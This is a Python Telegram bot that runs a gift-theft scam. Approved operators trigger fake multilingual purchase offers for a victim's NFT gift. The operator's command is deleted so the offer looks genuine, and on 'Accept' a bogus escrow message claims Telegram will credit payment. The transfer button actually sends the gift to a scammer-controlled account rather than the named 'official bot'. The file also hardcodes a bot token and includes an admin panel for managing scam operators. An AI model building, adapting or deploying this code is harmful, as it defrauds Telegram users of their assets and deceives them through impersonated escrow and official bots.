import re
import asyncio
import logging
import os
import aiohttp
import sqlite3
from threading import Thread
from flask import Flask
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
RENDER_URL = "https://portals-ams5.onrender.com" 
MAIN_ADMIN_ID = 8438026734

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, role TEXT)''')
    cursor.execute("INSERT OR IGNORE INTO users (id, role) VALUES (?, ?)", (MAIN_ADMIN_ID, "admin"))
    conn.commit()
    conn.close()

def get_user_role(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT role FROM users WHERE id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def add_user(user_id, role="user"):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO users (id, role) VALUES (?, ?)", (user_id, role))
    conn.commit()
    conn.close()

def del_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM users WHERE id = ? AND id != ?", (user_id, MAIN_ADMIN_ID))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT id, role FROM users")
    users = cursor.fetchall()
    conn.close()
    return users

init_db()

app = Flask(__name__)

@app.route('/')
def index():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RENDER_URL) as response:
                    pass
        except Exception:
            pass
        await asyncio.sleep(600)

TEXTS = {
    "ru": {
        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.\n<a href='{nft_link}'></a>",
        "btn_show": "ПОКАЗАТЬ ПОДАРОК",
        "btn_decline": "Отклонить",
        "btn_accept": "Принять",
        "accepted": "<b>Покупатель зарезервировал ваш подарок.</b>\n\n<blockquote>Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n<b>Для завершения сделки:</b>\n1. Передайте подарок официальному боту: {transfer_bot}\n2. Нажмите «Передать NFT» и выберите NFT.\n3. Подтвердите передачу подарка.\n\nTelegram зафиксирует транзакцию и моментально зачислит {price} на ваш аккаунт.\n\n<b>Резерв действует 24 часа.</b></blockquote>",
        "btn_transfer": "Передать NFT"
    },
    "en": {
        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.\n<a href='{nft_link}'></a>",
        "btn_show": "SHOW GIFT",
        "btn_decline": "Decline",
        "btn_accept": "Accept",
        "accepted": "<b>The buyer has reserved your gift.</b>\n\n<blockquote>Funds are held in a special escrow account and will be credited to the balance after the gift is transferred.\n\n<b>To complete the deal:</b>\n1. Transfer the gift to the official bot: {transfer_bot}\n2. Click 'Transfer NFT' and select the NFT.\n3. Confirm the transfer of the gift.\n\nTelegram will record the transaction and instantly credit {price} to your account.\n\n<b>The reservation is valid for 24 hours.</b></blockquote>",
        "btn_transfer": "Transfer NFT"
    },
    "zh": {
        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。\n<a href='{nft_link}'></a>",
        "btn_show": "显示礼物",
        "btn_decline": "拒绝",
        "btn_accept": "接受",
        "accepted": "<b>买家已预订您的礼物。</b>\n\n<blockquote>资金存放在特殊的托管账户中，将在礼物转移后记入余额。\n\n<b>完成交易：</b>\n1. 将礼物转移给官方机器人：{transfer_bot}\n2. 点击“转移 NFT”并选择 NFT。\n3. 确认礼物转移。\n\nTelegram 将记录交易并立即将 {price} 记入您的账户。\n\n<b>预订有效期为 24 小时。</b></blockquote>",
        "btn_transfer": "转移 NFT"
    }
}

async def create_offer(chat_id, user_id, user_full_name, command_text, business_connection_id=None):
    command = command_text.split()[0].lower()
    lang = "ru" if command == "/price" else ("en" if command == "/prace" else "zh")
    t = TEXTS[lang]

    pattern = r"^/(price|prace|proce)\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
    match = re.match(pattern, command_text, re.IGNORECASE)
    if not match:
        return

    _, nft_link, price_value, currency, target_user = match.groups()
    price_text = f"{price_value} ⭐" if currency.lower() == "stars" else f"{price_value} 💎"
    
    nft_name_formatted = nft_link.split('/')[-1].replace('-', '').capitalize()
    user_link = f"<a href='tg://user?id={user_id}'>{user_full_name}</a>"

    final_text = t["offer"].format(user_link=user_link, price=price_text, nft_name=nft_name_formatted, nft_link=nft_link)

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["btn_show"], url=nft_link)],
        [
            InlineKeyboardButton(text=t["btn_decline"], callback_data=f"decline:{lang}"),
            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"accept:{price_text}:{lang}")
        ]
    ])

    try:
        await bot.send_message(
            chat_id=chat_id,
            text=final_text,
            business_connection_id=business_connection_id,
            reply_markup=keyboard,
            disable_web_page_preview=False
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке офера: {e}")

@dp.message(F.text == "/start")
async def start_command(message: types.Message):
    user_id = message.from_user.id
    role = get_user_role(user_id)

    if role in ["admin", "user"]:
        return

    admin_text = (
        f"🔔 <b>Новая заявка на доступ!</b>\n\n"
        f"👤 Имя: {message.from_user.full_name}\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"🔗 Юзернейм: @{message.from_user.username or 'нет'}"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"approve:{user_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{user_id}")
        ]
    ])

    try:
        await bot.send_message(MAIN_ADMIN_ID, admin_text, reply_markup=keyboard)
    except Exception as e:
        logging.error(f"Ошибка при отправке заявки: {e}")

@dp.message(F.text == "/adminpanel")
async def admin_panel(message: types.Message):
    if get_user_role(message.from_user.id) != "admin":
        return

    text = (
        "👑 <b>Админ-панель</b>\n\n"
        "Доступные команды:\n"
        "📋 <code>/list_users</code> — Список всех участников\n"
        "➕ <code>/add_admin [ID]</code> — Назначить админом\n"
        "➕ <code>/add_user [ID]</code> — Добавить пользователя\n"
        "❌ <code>/del [ID]</code> — Удалить пользователя по ID\n"
        "📥 <code>/download_db</code> — Скачать файл базы\n"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Скачать базу (users.db)", callback_data="download_db")]
    ])
    
    await message.answer(text, reply_markup=keyboard)

@dp.message(F.text == "/list_users")
async def list_users(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    users = get_all_users()
    if not users:
        return

    text = "👥 <b>Список участников:</b>\n\n"
    for u_id, role in users:
        icon = "👑" if role == "admin" else "👤"
        text += f"{icon} <code>{u_id}</code> — {role}\n"
    
    await message.answer(text)

@dp.message(F.text.startswith("/add_admin"))
async def add_admin_cmd(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    try:
        target_id = int(message.text.split()[1])
        add_user(target_id, "admin")
        await message.answer(f"👑 Пользователь {target_id} назначен админом.")
        try:
            await bot.send_message(target_id, "👑 Вам выданы права администратора в боте.")
        except:
            pass
    except:
        await message.answer("❌ Формат: /add_admin 123456789")

@dp.message(F.text.startswith("/add_user"))
async def add_user_cmd(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    try:
        target_id = int(message.text.split()[1])
        add_user(target_id, "user")
        await message.answer(f"✅ Пользователь {target_id} добавлен.")
        try:
            await bot.send_message(target_id, "🎉 Вам выдан доступ к боту!")
        except:
            pass
    except:
        await message.answer("❌ Формат: /add_user 123456789")

@dp.message(F.text.startswith("/del"))
async def del_user_cmd(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("❌ Формат: /del 123456789 (ID пользователя)")
        return
        
    try:
        target_id = int(args[1])
    except ValueError:
        await message.answer("❌ Ошибка: нужно ввести цифровой ID, а не @юзернейм.")
        return

    if target_id == MAIN_ADMIN_ID:
        await message.answer("❌ Нельзя удалить главного админа.")
        return
        
    del_user(target_id)
    await message.answer(f"✅ Пользователь {target_id} удален из базы.")

@dp.message(F.text == "/download_db")
async def download_db_cmd(message: types.Message):
    if get_user_role(message.from_user.id) != "admin": return
    try:
        file = FSInputFile("users.db")
        await message.answer_document(file, caption="📦 Файл базы данных")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query(F.data == "download_db")
async def download_db_callback(callback: types.CallbackQuery):
    if get_user_role(callback.from_user.id) != "admin": return
    try:
        file = FSInputFile("users.db")
        await callback.message.answer_document(file, caption="📦 Файл базы данных")
    except Exception as e:
        await callback.message.answer(f"❌ Ошибка: {e}")
    await callback.answer()

@dp.callback_query(F.data.startswith("approve:"))
async def approve_user(callback: types.CallbackQuery):
    if get_user_role(callback.from_user.id) != "admin": return
    user_id = int(callback.data.split(":")[1])
    add_user(user_id, "user")
    
    await callback.message.edit_text(f"✅ Пользователь <code>{user_id}</code> одобрен.")
    try:
        await bot.send_message(user_id, "🎉 Ваша заявка одобрена! Теперь вы можете использовать /price.")
    except:
        pass
    await callback.answer()

@dp.callback_query(F.data.startswith("reject:"))
async def reject_user(callback: types.CallbackQuery):
    if get_user_role(callback.from_user.id) != "admin": return
    user_id = int(callback.data.split(":")[1])
    await callback.message.edit_text(f"❌ Пользователь <code>{user_id}</code> отклонен.")
    await callback.answer()

@dp.business_message(F.text.regexp(r"^/(price|prace|proce)\s+"))
async def handle_business_price(message: types.Message):
    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception:
        pass
    await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text, message.business_connection_id)

@dp.message(F.text.regexp(r"^/(price|prace|proce)\s+"))
async def handle_private_price(message: types.Message):
    if get_user_role(message.from_user.id) not in ["admin", "user"]: return
    try:
        await message.delete()
    except Exception:
        pass
    await create_offer(message.chat.id, message.from_user.id, message.from_user.full_name, message.text)

@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: types.CallbackQuery):
    await callback.answer()
    try:
        parts = callback.data.split(":")
        price_str, lang = parts[1], parts[2]
        t = TEXTS[lang]

        target_username = "portalNftReplayer" 
        gift_link = f"tg://send_gift?to={target_username}"

        new_text = t["accepted"].format(transfer_bot="@portals_nftbot", price=price_str)
        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]
        ])

        if callback.message.business_connection_id:
            await bot.edit_message_text(
                text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
                reply_markup=new_keyboard, business_connection_id=callback.message.business_connection_id
            )
        else:
            await bot.edit_message_text(
                text=new_text, chat_id=callback.message.chat.id, message_id=callback.message.message_id,
                reply_markup=new_keyboard
            )
    except Exception as e:
        logging.error(f"Ошибка в кнопке: {e}")

@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: types.CallbackQuery):
    lang = callback.data.split(":")[1]
    msg = "Вы отклонили предложение." if lang == "ru" else ("You have declined the offer." if lang == "en" else "您已拒绝该报价。")
    await callback.answer(msg, show_alert=True)

async def main():
    Thread(target=run_flask, daemon=True).start()
    asyncio.create_task(keep_alive()) 
    print("Бот запущен.")
    await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query", "message"])

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен.")
